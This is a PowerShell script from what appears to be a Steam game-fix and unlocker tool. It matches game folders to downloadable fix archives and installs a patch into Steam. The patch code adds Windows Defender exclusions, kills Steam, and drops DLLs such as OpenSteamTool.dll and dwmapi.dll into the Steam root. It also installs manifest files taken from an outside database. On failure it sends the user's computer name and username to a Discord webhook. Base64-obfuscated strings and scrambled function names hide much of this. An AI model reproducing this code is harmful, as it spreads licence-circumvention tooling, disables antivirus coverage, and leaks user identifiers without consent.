$WORKING_GAMES_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfd29ya2luZ19nYW1lcy5qc29u"))
$AUTO_FIXED_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfYXV0b19maXhlZC5qc29u"))
$FIX_MANIFEST_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfZml4X21hbmlmZXN0Lmpzb24="))
$AUTO_FIX_EXCLUSIONS = @("resident evil 4", "re4")

function Ec8Tu {
    param([string]$s)
    $parts = @([regex]::Split($s, '(?<=[a-z])(?=[A-Z0-9])|(?<=[A-Z0-9])(?=[a-z])|[\s\._-]+') | Where-Object { $_ -and $_.Length -gt 0 })
    if ($parts.Count -le 1) { return $s }
    return ($parts | ForEach-Object { $_.ToLower() }) -join ' '
}

function Nn1Yw {
    param([string]$n)
    if ([string]::IsNullOrEmpty($n)) { return '' }
    try {
        $n = $n.Normalize([System.Text.NormalizationForm]::FormD)
        $n = [regex]::Replace($n, '\p{Mn}', '')
    } catch {}
    return ($n -replace '[^a-z0-9 ]', '').ToLower().Trim()
}

function Gl9Dz {
    param([string]$a, [string]$b)
    $n = $a.Length; $m = $b.Length
    if ($n -eq 0) { return $m }; if ($m -eq 0) { return $n }
    $prev = New-Object int[] ($m + 1)
    $curr = New-Object int[] ($m + 1)
    for ($j = 0; $j -le $m; $j++) { $prev[$j] = $j }
    for ($i = 1; $i -le $n; $i++) {
        $curr[0] = $i
        for ($j = 1; $j -le $m; $j++) {
            $cost = if ($a[$i-1] -ceq $b[$j-1]) { 0 } else { 1 }
            $del = $prev[$j] + 1; $ins = $curr[$j-1] + 1; $sub = $prev[$j-1] + $cost
            $min = $del; if ($ins -lt $min) { $min = $ins }; if ($sub -lt $min) { $min = $sub }
            $curr[$j] = $min
        }
        $tmp = $prev; $prev = $curr; $curr = $tmp
    }
    return $prev[$m]
}

$script:bibEditionWords=@('definitive edition','definitive','remastered','remaster','remake','enhanced edition','enhanced','anniversary edition','anniversary','complete edition','complete','deluxe edition','deluxe','ultimate edition','ultimate','game of the year','goty','collection','directors cut','directors','extended edition','extended','gold edition','gold','premium edition','premium','standard edition','standard','classic','edition')
function Remove-BibEdition([string]$s) {
    $t=' '+$s+' '
    foreach($w in $script:bibEditionWords){ try{ $t=$t -replace ('\s'+[regex]::Escape($w)+'\s'),' ' }catch{} }
    return $t.Trim()
}
function Ff2Xa {
    param([string]$gameFolderName, [hashtable]$fixes)
    if ($fixes.ContainsKey($gameFolderName)) { return $gameFolderName, $fixes[$gameFolderName] }
    $gfn = Nn1Yw $gameFolderName
    $gfnExpanded = Nn1Yw (Ec8Tu $gameFolderName)
    $bestFix = $null; $bestUrl = $null; $bestScore = 0
    foreach ($f in $fixes.Keys) {
        $ffn = Nn1Yw $f
        $ffnExpanded = Nn1Yw (Ec8Tu $f)
        if ($ffn -eq $gfn) { return $f, $fixes[$f] }
        if ($ffnExpanded -eq $gfnExpanded) { return $f, $fixes[$f] }
        $useGfn = $gfnExpanded; $useFfn = $ffnExpanded
        $escG = ""; $escF = ""
        try { $escG = [System.Management.Automation.WildcardPattern]::Escape($useGfn) } catch { $escG = $useGfn }
        try { $escF = [System.Management.Automation.WildcardPattern]::Escape($useFfn) } catch { $escF = $useFfn }
        $maxLen = [Math]::Max($useFfn.Length, $useGfn.Length)
        $minLen = [Math]::Min($useFfn.Length, $useGfn.Length)
        if ($useFfn -like "*$escG*" -or $useGfn -like "*$escF*") {
            $shorter = if ($useFfn.Length -le $useGfn.Length) { $useFfn } else { $useGfn }
            $longer = if ($useFfn.Length -gt $useGfn.Length) { $useFfn } else { $useGfn }
            $isPrefix = $longer.StartsWith($shorter) -and $longer.Length -gt $shorter.Length
            $extraLen = if ($isPrefix) { $longer.Length - $shorter.Length } else { 0 }
            if ($isPrefix -and $extraLen -ge [Math]::Floor($shorter.Length * 0.3)) { }
            elseif ($minLen -ge $maxLen * 0.4) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
        }
    }
    if(-not $bestFix){
        $gBase=Nn1Yw (Remove-BibEdition (([string]$gameFolderName).ToLower()))
        if($gBase){
            foreach($f in $fixes.Keys){
                $fBase=Nn1Yw (Remove-BibEdition (([string]$f).ToLower()))
                if($fBase -and $fBase -eq $gBase){ return $f, $fixes[$f] }
            }
        }
    }
    if(-not $bestFix){
        $bestD=999
        foreach($f in $fixes.Keys){
            $ff2=Nn1Yw (Ec8Tu $f)
            if(-not $ff2){continue}
            $mx=[Math]::Max($ff2.Length,$gfnExpanded.Length)
            if($mx -lt 6){continue}
            $d=Gl9Dz $ff2 $gfnExpanded
            if($d -le [Math]::Floor($mx*0.2) -and $d -lt $bestD){ $bestD=$d; $bestFix=$f; $bestUrl=$fixes[$f] }
        }
    }
    return $bestFix, $bestUrl
}

function Set-BibRepairProgress([string]$t) {
    try { if($script:bibRepairProgress -is [System.Collections.Hashtable]){ $script:bibRepairProgress['text']=$t } } catch {}
    try {
        $onUI=$true
        try { if($script:bibRepairJob -and $script:bibRepairJob.h -and -not $script:bibRepairJob.h.IsCompleted){ $onUI=$false } } catch {}
        if($onUI -and $script:bdtStatus -and -not $script:bdtStatus.IsDisposed){ $script:bdtStatus.Text=$t }
    } catch {}
    try { [System.Windows.Forms.Application]::DoEvents() } catch {}
}
function Download-FixArchive {
    param([string]$url,[string]$outFile,[string]$gameName)
    $part=$outFile+'.part'
    $lastError='Descarga no valida'
    $ProgressPreference='SilentlyContinue'
    for($attempt=1;$attempt -le 3;$attempt++){
        try {
            Set-BibRepairProgress "Buscando reparacion..."
            Remove-Item -LiteralPath $part -Force -ErrorAction SilentlyContinue
            $requestUrl=$url
            if($attempt -eq 2 -and $requestUrl -notmatch '[?]'){ $requestUrl+='?download=1' }
            Invoke-WebRequest -Uri $requestUrl -OutFile $part -UseBasicParsing -TimeoutSec 45 -MaximumRedirection 8 -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) BastissSteam'} -ErrorAction Stop
            if(-not(Test-Path -LiteralPath $part) -or (Get-Item -LiteralPath $part).Length -lt 64){ throw 'El archivo descargado esta vacio o incompleto' }
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
            $archive=[System.IO.Compression.ZipFile]::OpenRead($part)
            try { if($archive.Entries.Count -eq 0){throw 'El ZIP no contiene archivos'} } finally { $archive.Dispose() }
            Remove-Item -LiteralPath $outFile -Force -ErrorAction SilentlyContinue
            Move-Item -LiteralPath $part -Destination $outFile -Force
            return $true
        } catch {
            $lastError=$_.Exception.Message
            Remove-Item -LiteralPath $part -Force -ErrorAction SilentlyContinue
            if($attempt -lt 3){ Start-Sleep -Milliseconds ([int](250*[Math]::Pow(2,$attempt-1))) }
        }
    }
    throw "No se pudo descargar un ZIP valido tras 3 intentos: $lastError"
}
function Apply-FixAutomatically {
    param([string]$gameFolderName, [string]$gamePath, [hashtable]$fixes)
    $fixName, $fixUrl = Ff2Xa $gameFolderName $fixes
    if (-not $fixUrl) { return $false, "No hay reparacion disponible para $gameFolderName" }
    $zip = Join-Path $env:TEMP "auto_$(Get-Random).zip"
    try {
        Set-BibRepairProgress "Buscando reparacion..."
        [void](Download-FixArchive -url $fixUrl -outFile $zip -gameName $gameFolderName)
        $extractedRelative = @()
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
            $z = [System.IO.Compression.ZipFile]::OpenRead($zip)
            foreach ($entry in $z.Entries) { if ($entry.Name) { $extractedRelative += $entry.FullName } }
            $z.Dispose()
        } catch {}
        Set-BibRepairProgress "Aplicando reparacion..."
        Expand-Archive -Path $zip -DestinationPath $gamePath -Force
        if ($extractedRelative.Count -gt 0) { Am3Fs $gameFolderName $gamePath $extractedRelative }
        Aw8Nq $gameFolderName
        Add-AutoFixedGame $gameFolderName
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        return $true, "Reparacion '$fixName' aplicada correctamente a $gameFolderName"
    } catch {
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath ($zip+'.part') -Force -ErrorAction SilentlyContinue
        return $false, "Error al aplicar reparacion en $gameFolderName : $($_.Exception.Message)"
    }
}

function Get-WorkingGames {
    if (Test-Path $WORKING_GAMES_FILE) {
        try { $r = @(Get-Content $WORKING_GAMES_FILE -Raw | ConvertFrom-Json); return ,$r } catch {}
    }
    return @()
}

function Aw8Nq {
    param([string]$gameFolderName)
    $games = @(Get-WorkingGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $WORKING_GAMES_FILE -Force }
}

function Get-AutoFixedGames {
    if (Test-Path $AUTO_FIXED_FILE) {
        try { $list = @(Get-Content $AUTO_FIXED_FILE -Raw | ConvertFrom-Json); $r = @($list | Where-Object { -not (Should-ExcludeFromAutoFix $_) }); return ,$r } catch {}
    }
    return @()
}

function Add-AutoFixedGame {
    param([string]$gameFolderName)
    if (Should-ExcludeFromAutoFix $gameFolderName) { return }
    $games = @(Get-AutoFixedGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $AUTO_FIXED_FILE -Force }
}

function Should-ExcludeFromAutoFix {
    param([string]$gameName)
    $norm = Nn1Yw $gameName
    foreach ($ex in $AUTO_FIX_EXCLUSIONS) {
        if ($norm -match [regex]::Escape($ex)) { return $true }
        if ($norm -eq $ex) { return $true }
    }
    return $false
}

function Get-FixManifest {
    if (Test-Path $FIX_MANIFEST_FILE) { try { $r = @(Get-Content $FIX_MANIFEST_FILE -Raw | ConvertFrom-Json); return ,$r } catch {} }
    return @()
}

function Save-FixManifest {
    param([array]$manifest)
    $manifest | ConvertTo-Json | Set-Content $FIX_MANIFEST_FILE -Force
}

function Test-FixApplied {
    param([string]$gameName)
    $manifest = Get-FixManifest
    $entry = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -eq $gameName }
    if (-not $entry) { return $false }
    if (-not ($entry.game_root -and (Test-Path $entry.game_root))) { return $false }
    $allExist = $true
    foreach ($f in $entry.files) { $fp = Join-Path $entry.game_root $f; if (-not (Test-Path $fp)) { $allExist = $false; break } }
    return $allExist
}

function Am3Fs {
    param([string]$gameName, [string]$gameRoot, [string[]]$newFiles)
    $manifest = Get-FixManifest
    $manifest = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -ne $gameName }
    $entry = [PSCustomObject]@{ game = $gameName; game_root = $gameRoot; files = @($newFiles) }
    $manifest += $entry
    Save-FixManifest $manifest
}


$script:ParcheDllHash=@{
    'dwmapi.dll'='5b9e0e2067a4a948d68d0a35dc6910ac24574c32f22e9db938db789febc81a63';
    'OpenSteamTool.dll'='b2ed24e0b4e2d0dae4caa8817ed4c0c34af8fdf056f356fd697ae1356ea22581';
    'xinput1_4.dll'='96fe0a6a6176703028ff674298de3ebd8f89f6f22a242db5587c66d51d1a9ac4'
}
function Test-ParcheActual {
    param([string]$root)
    if (-not $root) { return $false }
    foreach($k in $script:ParcheDllHash.Keys) {
        $p=Join-Path $root $k
        if (-not (Test-Path $p)) { return $false }
        if ($k -eq 'OpenSteamTool.dll') {
            try { $h=(Get-FileHash $p -Algorithm SHA256).Hash.ToLower(); if ($h -ne $script:ParcheDllHash[$k]) { return $false } } catch { return $false }
        }
    }
    if (Test-Path (Join-Path $root 'winmm.dll')) { return $false }
    return $true
}
function Xz9Qk {
    param([switch]$Silent)
    try {
        $srChk=$null; try { $srChk=Get-SteamPath } catch {}
        if (Test-ParcheActual $srChk) {
            try { Set-ParcheInstalado $true } catch {}
            if ($Silent) { return $true }
        }
    } catch {}
    $attempt=0
    while ($attempt -lt 3) {
        $attempt++
        try { $pmsgP = "Instalando archivos (intento $attempt/3)..."; try { $lblR.ForeColor=$script:Yellow; $lblR.Text=$pmsgP; [System.Windows.Forms.Application]::DoEvents() } catch {}; try { Write-Host $pmsgP } catch {} } catch {}
        try {
            $steamRoot = Get-SteamPath
            $defOk = $false
            try { $defOk = [bool](Add-SteamDefenderExclusions) } catch { $defOk = $false }
            try { if (Add-DefenderExclusion $steamRoot) { $defOk = $true } } catch {}
            if (-not $defOk) {
                try { $defOk = [bool](Add-SteamDefenderExclusions) } catch { $defOk = $false }
            }
            if (-not $defOk) {
                $defMsg = "Se pedira permiso de ADMINISTRADOR para continuar. Aceptalo cuando aparezca."
                if ($Silent) { try { Write-Host $defMsg } catch {} } else { try { $lblR.ForeColor=$script:Orange; $lblR.Text=$defMsg; [System.Windows.Forms.Application]::DoEvents() } catch {} }
            }
            Write-Phase "patch-excl-ok"
            Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
            Start-SleepDoEvents 2000
            $urls=@((D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3MvcGFyY2hlX251ZXZvLnppcA=="),"https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/parche_nuevo.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/parche_nuevo.zip")
            $data=$null; $dlErr=""
            try {
                $localParche='C:\Users\basti\OneDrive\Desktop\Nueva carpeta\backups\PARCHENEWw_backup_20260919_150549.zip'
                if (Test-Path -LiteralPath $localParche) {
                    $data=[IO.File]::ReadAllBytes((Get-Item -LiteralPath $localParche).FullName)
                    if (-not $data -or $data.Length -lt 1000) { $data=$null }
                }
            } catch { $data=$null }
            foreach ($u in $urls) {
                try { $tmp2=Join-Path $env:TEMP "patch_dl_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $crP = Invoke-CurlHidden @('-sL','--ssl-no-revoke','-o',$tmp3,$u,'--max-time','30') 40; if (($crP.exit -eq 0) -and (Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; break } } catch { $dlErr=$_.Exception.Message }
            }
            if (-not $data -or $data.Length -lt 1000) { throw "No se pudo descargar el componente tras 3 intentos: $dlErr" }
            Write-Phase "patch-dl-ok"
            $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
            [System.IO.File]::WriteAllBytes($tmpZip, $data)
            $extracted=$false
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
                $archX=[System.IO.Compression.ZipFile]::OpenRead($tmpZip)
                try {
                    foreach($entryX in $archX.Entries){
                        $relX=$entryX.FullName.TrimStart('/','\')
                        if([string]::IsNullOrWhiteSpace($relX) -or $entryX.FullName.EndsWith('/') -or $entryX.FullName.EndsWith('\')){ continue }
                        $fullX=Join-Path $steamRoot $relX
                        $dirX=[System.IO.Path]::GetDirectoryName($fullX)
                        if($dirX -and -not (Test-Path -LiteralPath $dirX)){ New-Item -ItemType Directory -Path $dirX -Force | Out-Null }
                        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entryX,$fullX,$true)
                    }
                    $extracted=$true
                    Write-Phase "patch-extract-ok"
                } finally { $archX.Dispose() }
            } catch { $extracted=$false }
            Remove-Item -LiteralPath $tmpZip -Force -ErrorAction SilentlyContinue
            try { $wmX=Join-Path $steamRoot 'winmm.dll'; if(Test-Path -LiteralPath $wmX){ Remove-Item -LiteralPath $wmX -Force -ErrorAction SilentlyContinue } } catch {}
            $okDll = $false
            if ($extracted) {
                $okDll = (Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll"))
                if ($okDll) {
                    $steamAbierto=$false
                    if (Test-Path (Join-Path $steamRoot (S("c3RlYW0uZXhl")))) { try { Start-Process (Join-Path $steamRoot (S("c3RlYW0uZXhl"))); $steamAbierto=$true } catch {} }
                    Set-ParcheInstalado $true
                    if (-not $Silent) { if ($steamAbierto) { [System.Windows.Forms.MessageBox]::Show("Activado correctamente.","Listo","OK","Information") } else { [System.Windows.Forms.MessageBox]::Show("Activado correctamente. Abri Steam manualmente.","Listo","OK","Information") } }
                    return $true
                }
            }
            if ((-not $okDll) -and (-not $defOk)) { throw "Sin proteccion de antivirus (acepta el permiso de ADMINISTRADOR) y los archivos se borran. Intento $attempt/3." }
            if ($attempt -ge 3) { throw "No se verifico instalacion de dlls tras 3 intentos" }
            Start-SleepDoEvents 1000
        } catch {
            if ($attempt -ge 3) {
                WEL (S("QWN0aXZhciBEaXJlY3Rv")) $_
                try {
                    $sr2=$null; try { $sr2=Get-SteamPath } catch {}
                    $has1=$false; $has2=$false; try { $has1=Test-Path (Join-Path $sr2 "OpenSteamTool.dll"); $has2=Test-Path (Join-Path $sr2 "xinput1_4.dll") } catch {}
                    $bt=[char]96
                    $msg="**PATCH FAIL (Xz9Qk)** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $sr2`n**dll:** $has1/$has2`n**Error:** $($_.Exception.Message)`n$bt$bt$bt$($_.ScriptStackTrace)$bt$bt$bt"
                    $pl=@{content=$msg}|ConvertTo-Json
                    Invoke-BgNoWait ({ param($u,$p) try { Send-DiscordJson $u $p 10 | Out-Null } catch {} }) @($WEBHOOK_URL,$pl)
                } catch {}
                if (-not $Silent) { [System.Windows.Forms.MessageBox]::Show("No se pudo reparar la activacion. Verifica tu conexion o revisa el log.","Solucionar activacion","OK","Error") }
                return $false
            }
            Start-SleepDoEvents 1000
        }
    }
    try {
        $sr3=$null; try { $sr3=Get-SteamPath } catch {}
        $has1b=$false; $has2b=$false; try { $has1b=Test-Path (Join-Path $sr3 "OpenSteamTool.dll"); $has2b=Test-Path (Join-Path $sr3 "xinput1_4.dll") } catch {}
        $bt2=[char]96
        $msg2="**PATCH FAIL (Xz9Qk)** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME`n**Steam:** $sr3`n**dll:** $has1b/$has2b`n**Error:** No se verifico dlls tras 3 intentos`n$bt2$bt2$bt2 no dll $bt2$bt2$bt2"
        $pl2=@{content=$msg2}|ConvertTo-Json
        Send-DiscordJson $WEBHOOK_URL $pl2 10 | Out-Null
    } catch {}
    return $false
}


function Get-ParcheInstalado {
    try { $v = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UGFyY2hlSW5zdGFsYWRv")) -ErrorAction SilentlyContinue).ParcheInstalado; if ($null -ne $v) { return ([int]$v -eq 1) } } catch {}
    try { $f = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcGFyY2hlLmZsYWc=')); if (Test-Path $f) { return ((Get-Content $f -Raw).Trim()) -eq "1" } } catch {}
    return $false
}
function Set-ParcheInstalado {
    param([bool]$on)
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UGFyY2hlSW5zdGFsYWRv")) -Value $(if ($on) { 1 } else { 0 }) -Type DWord -Force -ErrorAction SilentlyContinue; [System.IO.File]::WriteAllText((Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcGFyY2hlLmZsYWc='))), $(if ($on) { "1" } else { "0" }), $script:utf8NoBom) } catch {}
}


function Get-InstallFolderMap {
    if ($script:INSTALL_FOLDER_MAP) { return $script:INSTALL_FOLDER_MAP }
    $instMap = @{}
    foreach ($lib in Ss3Jd) {
        $appsDir = Join-Path $lib (S("c3RlYW1hcHBz"))
        if (-not (Test-Path -LiteralPath $appsDir)) { continue }
        Get-ChildItem -LiteralPath $appsDir -Filter 'appmanifest_*.acf' -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $txt = Get-Content -LiteralPath $_.FullName -Raw -ErrorAction SilentlyContinue
                if (-not $txt) { return }
                $mApp = [regex]::Match($txt, '"appid"\s+"(\d+)"')
                $mDir = [regex]::Match($txt, '"installdir"\s+"([^"]+)"')
                if ($mApp.Success -and $mDir.Success) {
                    $aid = $mApp.Groups[1].Value
                    $dir = $mDir.Groups[1].Value
                    if ($aid -and $dir -and -not $instMap.ContainsKey($aid)) { $instMap[$aid] = $dir }
                }
            } catch {}
        }
    }
    $script:INSTALL_FOLDER_MAP = $instMap
    return $instMap
}


$script:bibFixesCache = $null
$script:bibFixesCacheTime = [datetime]::MinValue
$script:bibFixesCacheLoaded = $false
function Qw7Rt {
    $cacheFile = Join-Path $env:TEMP 'bsmap_biblio_fixes.json'
    $now = Get-Date
    if ($script:bibFixesCache -and $script:bibFixesCache.Count -gt 0 -and (($now - $script:bibFixesCacheTime).TotalHours -lt 6)) { return $script:bibFixesCache }
    if (-not $script:bibFixesCacheLoaded) {
        $script:bibFixesCacheLoaded = $true
        try {
        if (Test-Path -LiteralPath $cacheFile) {
            $cacheItem = Get-Item -LiteralPath $cacheFile -ErrorAction Stop
            if (($now - $cacheItem.LastWriteTime).TotalHours -lt 24) {
                $cacheJson = [System.IO.File]::ReadAllText($cacheFile)
                $cacheObj = ConvertFrom-Json -InputObject $cacheJson -ErrorAction Stop
                $cacheMap = @{}
                foreach ($prop in $cacheObj.PSObject.Properties) { if ($prop.Name -and $prop.Value) { $cacheMap[[string]$prop.Name] = [string]$prop.Value } }
                if ($cacheMap.Count -gt 0) {
                    $script:bibFixesCache = $cacheMap
                    $script:bibFixesCacheTime = $cacheItem.LastWriteTime
                    if (($now-$cacheItem.LastWriteTime).TotalHours -lt 6) { return $script:bibFixesCache }
                }
            }
        }
        } catch {}
    }
    $stale = $script:bibFixesCache
    try {
        $jsonText=$null
        $listUrls=@((D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vbWFpbi9maXhlc19saXN0Lmpzb24="),"https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/fixes_list.json")
        foreach($listUrl in $listUrls){
            try {
                $listResponse=Invoke-WebRequest -Uri $listUrl -UseBasicParsing -TimeoutSec 10 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop
                $candidate=[string]$listResponse.Content
                $candidateData=ConvertFrom-Json -InputObject $candidate -ErrorAction Stop
                if(@($candidateData).Count -gt 0){$jsonText=$candidate;break}
            } catch {}
        }
        if(-not $jsonText){throw 'No se pudo obtener una lista de fixes valida'}
        $parsed = ConvertFrom-Json -InputObject $jsonText -ErrorAction Stop
        $fixes = @{}
        foreach ($f in @($parsed)) {
            if (-not $f -or -not $f.filename) { continue }
            $fileName=[System.IO.Path]::GetFileName([string]$f.filename)
            if(-not $fileName -or $fileName -notmatch '(?i)\.zip$'){continue}
            $name = $fileName -replace '(?i)\.zip$', ''
            $url = (D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3Mv") + [uri]::EscapeDataString($fileName)
            $fixes[$name] = $url
            if ($f.game -and $f.game.Trim().Length -gt 0 -and -not $fixes.ContainsKey([string]$f.game)) { $fixes[[string]$f.game] = $url }
        }
        try {
            $instM = Get-InstallFolderMap
            $fixIndex = 0
            foreach ($gKey in @($fixes.Keys)) {
                $fixIndex++

                $fixAppid = Find-AppIdByName ([string]$gKey)
                if (-not $fixAppid) { continue }
                $fixAppid = [string]$fixAppid
                if ($instM.ContainsKey($fixAppid)) {
                    $fixFolder = [string]$instM[$fixAppid]
                    if ($fixFolder -and -not $fixes.ContainsKey($fixFolder)) { $fixes[$fixFolder] = $fixes[$gKey] }
                }
            }
        } catch {}
        if ($fixes.Count -gt 0) {
            $script:bibFixesCache = $fixes
            $script:bibFixesCacheTime = Get-Date
            try { [System.IO.File]::WriteAllText($cacheFile, (ConvertTo-Json -InputObject $fixes -Depth 5 -Compress), (New-Object System.Text.UTF8Encoding $false)) } catch {}
        }
        return $fixes
    } catch { if ($stale -and $stale.Count -gt 0) { return $stale }; return @{} }
}

function Ii5Hb {
    $games = @{}
    foreach ($lib in Ss3Jd) {
        $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg=="))
        if (Test-Path $common) {
            Get-ChildItem -LiteralPath $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $games[$_.Name] = $_.FullName }
        }
    }
    return $games
}

function Ss3Jd {
    $steamRoot = Get-SteamPath
    $libs = @($steamRoot)
    $vdf = Join-Path $steamRoot (S("c3RlYW1hcHBzXGxpYnJhcnlmb2xkZXJzLnZkZg=="))
    if (Test-Path $vdf) {
        $v = Get-Content $vdf -Raw -ErrorAction SilentlyContinue
        [regex]::Matches($v, '"path"\s+"([^"]+)"') | ForEach-Object { $p = $_.Groups[1].Value; if (Test-Path $p) { $libs += $p } }
    }
    return $libs | Select-Object -Unique
}

function Repair-Manifests {
    param([string]$appid)
    $sbBase="https://raw.githubusercontent.com/SPIN0ZAi/SB_manifest_DB"
    $steamRoot=$null; try { $steamRoot=Get-SteamPath } catch {}
    if (-not $steamRoot) { return @{ok=$false; err="No se encontro Steam"} }
    $luaDir=Join-Path $steamRoot "config\stplug-in"
    $luaDir2=Join-Path $steamRoot "config\lua"
    $manDir=Join-Path $steamRoot "config\depotcache"
    foreach ($d in @($luaDir,$luaDir2,$manDir)) { if (-not (Test-Path -LiteralPath $d)) { try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {} } }
    $tmp=Join-Path $env:TEMP "sb_repair_$(Get-Random)"
    try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch { return @{ok=$false; err="No se pudo crear carpeta temporal"} }
    $luaOk=$false; $manCount=0; $errs=@()
    try {
        try {
            Invoke-WebRequest -Uri "$sbBase/$appid/$appid.lua" -OutFile (Join-Path $tmp "$appid.lua") -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            $txt=Get-Content (Join-Path $tmp "$appid.lua") -Raw
            if ($txt -match "setManifestid") { $luaOk=$true } else { $errs+="lua sin setManifestid" }
        } catch { $errs+="lua: "+$_.Exception.Message }
        if ($luaOk) {
            try { Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir "$appid.lua") -Force; Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir2 "$appid.lua") -Force } catch { $errs+="copiar lua: "+$_.Exception.Message }
        }
        $ids=@()
        try { $ids=@([regex]::Matches($txt,'setManifestid\((\d+),\s*"(\d+)"') | ForEach-Object { "$($_.Groups[1].Value)_$($_.Groups[2].Value).manifest" }) | Select-Object -Unique } catch {}
        foreach ($m in $ids) {
            try {
                Invoke-WebRequest -Uri "$sbBase/$appid/$m" -OutFile (Join-Path $tmp $m) -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
                if ((Get-Item (Join-Path $tmp $m)).Length -gt 100) { Copy-Item -LiteralPath (Join-Path $tmp $m) -Destination (Join-Path $manDir $m) -Force; $manCount++ }
            } catch { $errs+="$m fallo" }
        }
    } catch { $errs+=$_.Exception.Message }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    return @{ ok=($luaOk -and $manCount -gt 0); lua=$luaOk; manifest=$manCount; err=($errs -join "; ") }
}

function Gg4Zs {
    param([string]$fixName, [hashtable]$games)
    $clean = $fixName -replace '(?i)\s*(UB|Ubisoft)?\s*(Bypass|Fix|Patch|Fix)\s*$', ''
    $clean = $clean -replace '(?i)\s*\(\d+\)\s*$', ''
    $clean = $clean -replace '_', ' '
    $clean = $clean.Trim()
    $fn = Nn1Yw $clean
    $fnWords = @($fn -split '\s+' | Where-Object { $_.Length -gt 0 })
    $bestMatch = $null; $bestScore = 0
    foreach ($g in $games.Keys) {
        $gfn = Nn1Yw $g
        $maxLen = [Math]::Max($fn.Length, $gfn.Length)
        $minLen = [Math]::Min($fn.Length, $gfn.Length)
        if ($fn -eq $gfn) { return $games[$g], $g }
        if ($fn -like "*$gfn*" -or $gfn -like "*$fn*") {
            $shorter = if ($fn.Length -le $gfn.Length) { $fn } else { $gfn }
            $longer = if ($fn.Length -gt $gfn.Length) { $fn } else { $gfn }
            if ($minLen -ge $maxLen * 0.6) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
        $gWords = @($gfn -split '\s+' | Where-Object { $_.Length -gt 0 })
        $common = 0
        foreach ($w in $fnWords) {
            foreach ($gw in $gWords) {
                if ($w -eq $gw) { $common++; break }
                if ($w -like "*$gw*" -or $gw -like "*$w*") { $common += 0.5; break }
            }
        }
        $total = [Math]::Max($fnWords.Count, $gWords.Count)
        if ($total -gt 0) {
            $ratio = $common / $total
            if ($ratio -ge 0.4 -and $ratio -gt $bestScore) { $bestScore = $ratio; $bestMatch = $g }
        }
        if ($maxLen -gt 3) {
            $dist = Gl9Dz $fn $gfn
            $threshold = [Math]::Max(1, [Math]::Floor($maxLen * 0.2))
            if ($dist -le $threshold) { $score = $maxLen - $dist; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
    }
